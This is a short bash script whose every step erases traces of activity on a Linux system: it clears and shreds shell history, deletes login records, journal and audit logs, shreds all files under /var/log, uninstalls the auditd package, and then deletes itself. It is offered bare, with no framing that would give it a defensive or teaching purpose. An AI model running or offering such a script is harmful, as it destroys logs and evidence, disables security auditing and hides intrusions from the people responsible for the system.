#!/bin/bash

# Clear shell history
history -c && history -w
rm -f ~/.bash_history /var/log/wtmp /var/log/btmp /var/log/lastlog
unset HISTFILE

# Vacuum and remove journal logs
journalctl --vacuum-time=1s
rm -rf /var/log/journal/* /var/log/audit/*

# Restart journal service
systemctl restart systemd-journald

# Reset Bash history settings
export HISTSIZE=0 HISTFILESIZE=0
cat /dev/null > ~/.bash_history && history -c && history -w
shred -u ~/.bash_history

# Shred all log files
find /var/log -type f -exec shred -u {} \;

# Restart rsyslog and journald services
systemctl restart rsyslog
systemctl restart systemd-journald

# Remove auditd package and dependencies
rpm -qa | grep audit | xargs yum remove -y

# Remove the script itself after operation
rm -- "$0"

# Exit the session
exit
